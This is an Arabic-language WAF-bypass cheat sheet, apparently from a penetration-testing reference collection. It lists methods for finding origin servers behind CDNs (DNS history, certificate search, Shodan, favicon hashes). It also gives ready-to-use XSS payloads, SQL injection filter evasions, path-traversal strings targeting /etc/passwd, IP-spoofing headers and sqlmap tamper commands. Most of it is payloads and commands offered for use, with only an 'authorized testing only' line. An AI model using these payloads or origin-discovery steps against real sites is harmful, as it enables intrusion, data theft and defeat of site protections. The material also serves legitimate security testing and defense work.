<a id="-waf-bypass-cheatsheet"></a>
# 🛡️ مرجع سريع لتجاوز جدران حماية تطبيقات الويب (WAF)

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗    ██╗ █████╗ ███████╗    ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
  ██║    ██║██╔══██╗██╔════╝    ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
  ██║ █╗ ██║███████║█████╗      ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
  ██║███╗██║██╔══██║██╔══╝      ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
  ╚███╔███╔╝██║  ██║██║         ██████╔╝   ██║   ██║     ██║  ██║███████║███████║
   ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝         ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
   Web Application Firewall Bypass
```

> يعرض الرسم النصي عنوان الصفحة بالإنجليزية؛ WAF اختصار لجدار حماية تطبيقات الويب. الأمثلة التالية احتمالات تتوقف على قواعد الحماية وطريقة معالجة التطبيق للمدخلات، ولا تضمن التجاوز.

---

<a id="-what-is-waf-bypass"></a>
## 🎯 ما هو تجاوز WAF

تتيح تقنيات **تجاوز جدار حماية تطبيقات الويب (WAF bypass)** لمختبري الاختراق تفادي قواعد الحماية والوصول إلى الخادم الأصلي أو إيصال حمولات الاختبار.

<a id="common-wafs"></a>
### جدران حماية تطبيقات الويب الشائعة
- Cloudflare
- AWS WAF
- Akamai
- Imperva/Incapsula
- ModSecurity
- F5 BIG-IP
- Fortinet FortiWeb
- Sucuri

---

<a id="-waf-detection"></a>
## 🔍 اكتشاف WAF

<a id="wafw00f"></a>
### wafw00f
```bash
# اكتشاف WAF
wafw00f https://target.com

# خرج تفصيلي
wafw00f https://target.com -v

# اختبار جميع أنواع WAF
wafw00f https://target.com -a
```

<a id="manual-detection"></a>
### الاكتشاف اليدوي
```bash
# فحص ترويسات الاستجابة
curl -I https://target.com

# البحث عن:
# - Server: cloudflare
# - X-Sucuri-ID
# - X-CDN: Incapsula
# - cf-ray (Cloudflare)
```

---

<a id="-origin-ip-discovery"></a>
## 🌐 اكتشاف عنوان IP للخادم الأصلي

<a id="dns-history"></a>
### سجل DNS التاريخي
```bash
# خدمات يمكن الرجوع إليها:
# - SecurityTrails.com
# - ViewDNS.info/iphistory
# - DNSHistory.org
# - CompleteDNS.com

# واجهة API لخدمة SecurityTrails
curl "https://api.securitytrails.com/v1/history/target.com/dns/a" \
  -H "APIKEY: YOUR_KEY"
```

<a id="ssl-certificate-search"></a>
### البحث عن شهادات SSL
```bash
# البحث عن الشهادات في Censys.io
# البحث عن target.com في الشهادة

# crt.sh - شفافية الشهادات (Certificate Transparency)
curl "https://crt.sh/?q=target.com&output=json" | jq

# Censys CLI
censys search "parsed.names: target.com"
```

<a id="shodancensys"></a>
### Shodan/Censys
```bash
# Shodan
shodan search "ssl:target.com"
shodan search "hostname:target.com"

# Shodan - البحث ببصمة شهادة SSL
shodan search "ssl.cert.fingerprint:XXXX"

# Censys
# Search: services.tls.certificates.leaf_data.subject.common_name: target.com
```

<a id="email-headers"></a>
### ترويسات البريد الإلكتروني
```bash
# الاشتراك في نشرة بريدية أو إشعار
# فحص ترويسات البريد بحثًا عن عنوان IP للخادم الأصلي

# البحث عن:
# Received: from [ORIGIN_IP]
# X-Originating-IP: [ORIGIN_IP]
```

<a id="subdomains-without-cdn"></a>
### نطاقات فرعية لا تمر عبر شبكة توزيع محتوى (CDN)
```bash
# تحديد النطاقات الفرعية
subfinder -d target.com -o subs.txt

# التحقق من النطاقات التي تمر عبر CDN
cat subs.txt | httpx -ip

# البحث عن:
# - mail.target.com
# - ftp.target.com
# - dev.target.com
# - staging.target.com
# - api-internal.target.com
# - vpn.target.com
```

<a id="favicon-hash"></a>
### بصمة أيقونة الموقع (Favicon hash)
```bash
# حساب بصمة أيقونة الموقع
curl -s https://target.com/favicon.ico | md5sum

# البحث في Shodan باستخدام بصمة أيقونة الموقع
python3 -c "import mmh3,requests,codecs; print(mmh3.hash(codecs.encode(requests.get('https://target.com/favicon.ico').content,'base64')))"

# بحث Shodan
shodan search "http.favicon.hash:HASH_VALUE"
```

> **تصحيح للبصمة:** مرشح Shodan الخاص بأيقونة الموقع يستخدم MurmurHash3 لمحتوى الأيقونة المرمّز بـ Base64؛ لذلك لا تعادل نتيجة أمر MD5 الأول قيمة هذا المرشح. أما مثال Python فيستخدم خوارزمية MurmurHash3 مع محتوى Base64. وتشابه البصمة قرينة ارتباط، وليس إثباتًا منفردًا لعنوان الخادم الأصلي. [شرح Shodan الرسمي](https://blog.shodan.io/deep-dive-http-favicon/).

<a id="ipv6-bypass"></a>
### التجاوز باستخدام IPv6
```bash
# قد لا تشمل حماية WAF الوصول عبر IPv6
dig AAAA target.com
curl -g "http://[IPv6_ADDRESS]/" -H "Host: target.com"
```

<a id="cloud-ranges"></a>
### نطاقات عناوين مزوّدي السحابة
```bash
# تنزيل نطاقات عناوين IP السحابية
# AWS: https://ip-ranges.amazonaws.com/ip-ranges.json
# Azure: https://www.microsoft.com/en-us/download/details.aspx?id=56519
# GCP: https://www.gstatic.com/ipranges/cloud.json

# إذا كان عنوان IP للهدف خارج النطاقات السحابية، فقد يكون عنوان الخادم الأصلي
```

---

<a id="-payload-encoding-bypass"></a>
## 🔓 التجاوز بترميز الحمولات

<a id="url-encoding"></a>
### ترميز URL
```
# ترميز مرة واحدة
<script> → %3Cscript%3E

# ترميز مزدوج
<script> → %253Cscript%253E

# ترميز مختلط
<script> → %3Cscr%69pt%3E
```

<a id="unicode-encoding"></a>
### ترميز Unicode
```
# UTF-8
<script> → %C0%BC%73%63%72%69%70%74%C0%BE

# تسلسلات هروب Unicode
<script> → \u003cscript\u003e

# كيانات HTML
<script> → &#60;script&#62;
<script> → &#x3c;script&#x3e;
```

> **تصحيح للترميز:** تسلسلا `%C0%BC` و`%C0%BE` في مثال المصدر ترميز زائد الطول وغير صالح وفق UTF-8 المعياري؛ وهما مثال تاريخي على استغلال محلّلات غير صارمة، لا تمثيل UTF-8 صحيحًا للرمزين. احتُفظ بهما كما وردا. [RFC 3629](https://datatracker.ietf.org/doc/html/rfc3629#section-3).

<a id="case-manipulation"></a>
### تغيير حالة الأحرف
```
<script> → <ScRiPt>
<script> → <SCRIPT>
SELECT → SeLeCt
UNION → UnIoN
```

<a id="null-bytes"></a>
### البايتات الصفرية (Null bytes)
```
# حقن بايت صفري
<scri%00pt>
<script%00>alert(1)</script>
SEL%00ECT
```

<a id="comments"></a>
### التعليقات
```sql
# تعليقات SQL
SEL/**/ECT
UNION/**/SELECT
UN/**/ION/**/SE/**/LECT

# تعليقات داخل السطر
SELECT/*comment*/FROM
1'/**/OR/**/1=1--
```

<a id="whitespace-alternatives"></a>
### بدائل المحارف البيضاء
```sql
# محرف جدولة وسطر جديد وإرجاع مؤشر الكتابة
SELECT%09FROM
SELECT%0AFROM
SELECT%0DFROM

# علامة الجمع
UNION+SELECT
1'+OR+1=1--
```

---

<a id="-waf-specific-bypasses"></a>
## 🔥 أساليب تجاوز خاصة بقواعد WAF

<a id="xss-bypass"></a>
### تجاوز مرشحات XSS
```html
# الصيغة المعتادة محظورة
<script>alert(1)</script>

# صيغ بديلة للتجاوز
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>

# دون أقواس
<img src=x onerror=alert`1`>
<img src=x onerror=alert&lpar;1&rpar;>

# دون alert
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<img src=x onerror=eval('ale'+'rt(1)')>
```

<a id="sqli-bypass"></a>
### تجاوز مرشحات حقن SQL
```sql
# تجاوز ترشيح UNION
UNION SELECT → UNION ALL SELECT
UNION SELECT → /*!50000UNION*/ SELECT
UNION SELECT → %55nion %53elect
UNION SELECT → uNioN sEleCt

# التجاوز باستخدام التعليقات
-- → #
-- → --+
-- → --%00
-- → /**/

# التجاوز بالشروط المنطقية
OR 1=1 → OR 2=2
OR 1=1 → OR 'a'='a'
OR 1=1 → || 1=1
AND 1=1 → && 1=1

# تعليقات مشروطة بالإصدار في MySQL
/*!50000SELECT*/ → يُنفّذ فقط إذا كان MySQL >= 5.0
```

> **ملاحظة توافق SQL:** الأمثلة تعتمد على لهجة قاعدة البيانات وطريقة إزالة المرشحات للتعليقات؛ وضع تعليق داخل كلمة مفتاحية لا يضمن إعادة تجميعها في استعلام صالح. وفي تعليقات MySQL المشروطة بالإصدار ينبغي أن يتبع رقم الإصدار فراغ أو نهاية التعليق؛ تحتفظ هذه الصفحة بصيغ المصدر القديمة كما هي. [دليل تعليقات MySQL](https://dev.mysql.com/doc/refman/8.4/en/comments.html).

<a id="path-traversal-bypass"></a>
### تجاوز مرشحات اجتياز المسارات
```
../../../etc/passwd
..%2F..%2F..%2Fetc/passwd
..%252F..%252F..%252Fetc/passwd
....//....//....//etc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

---

<a id="-http-techniques"></a>
## 🛠️ تقنيات HTTP

<a id="http-parameter-pollution"></a>
### تلوث معاملات HTTP ‏(HPP)
```http
# معاملات مكررة
?id=1&id=2
?id=1&ID=2

# حقن المصفوفات
?id[]=1&id[]=2
?id=1&id=2&id=3
```

<a id="http-method-tampering"></a>
### التلاعب بأسلوب طلب HTTP
```bash
# تغيير أسلوب الطلب
curl -X POST → curl -X PUT
curl -X GET → curl -X TRACE

# ترويسات تجاوز أسلوب الطلب
X-HTTP-Method-Override: PUT
X-Method-Override: DELETE
X-HTTP-Method: PATCH
```

<a id="header-manipulation"></a>
### التلاعب بالترويسات
```http
# ترويسات انتحال عنوان IP
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
True-Client-IP: 127.0.0.1

# إرباك معالجة Content-Type
Content-Type: application/json
Content-Type: text/plain
Content-Type: application/xml
```

<a id="chunked-encoding"></a>
### ترميز النقل على أجزاء (Chunked encoding)
```http
Transfer-Encoding: chunked

4
test
0
```

---

<a id="-tools"></a>
## 🛠️ أدوات

| الأداة | الغرض |
|------|---------|
| **wafw00f** | اكتشاف WAF |
| **CloudFlair** | تحديد الخادم الأصلي خلف Cloudflare |
| **Bypass-Firewalls-by-DNS-History** | البحث في سجل DNS التاريخي |
| **WhatWaf** | اكتشاف WAF وتجاوزه |
| **sqlmap --tamper** | سكربتات تجاوز مرشحات حقن SQL |

<a id="sqlmap-tamper-scripts"></a>
### سكربتات تعديل الحمولات (Tamper) في sqlmap
```bash
# استخدام سكربتات تعديل الحمولات (Tamper)
sqlmap -u "http://target.com/id=1" --tamper=space2comment
sqlmap -u "http://target.com/id=1" --tamper=randomcase
sqlmap -u "http://target.com/id=1" --tamper=between

# استخدام عدة سكربتات تعديل
sqlmap -u "http://target.com/id=1" --tamper=space2comment,randomcase
```

---

<a id="-quick-reference"></a>
## 📊 مرجع سريع

| التقنية | حالة الاستخدام |
|-----------|----------|
| سجل DNS التاريخي | تحديد عنوان IP للخادم الأصلي |
| البحث عن شهادات SSL | البحث عن الشهادات في Censys/Shodan |
| تعداد النطاقات الفرعية | تحديد نطاقات فرعية لا تمر عبر CDN |
| الترميز | تجاوز المرشحات |
| تغيير حالة الأحرف | تجاوز القواعد البسيطة |
| التعليقات | تجزئة الكلمات المفتاحية |

---

<a id="-resources"></a>
## 📚 مصادر

- [PayloadsAllTheThings WAF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/WAF%20Bypass)
- [HackTricks WAF](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/waf-bypass)
- [تجاوز WAF من OWASP](https://owasp.org/www-community/attacks/Bypass_Web_Application_Firewall)

---

<p align="center">
  <b>🛡️ استكشاف تجاوز جدران WAF!</b><br>
  <i>للاختبارات المصرّح بها فقط!</i>
</p>
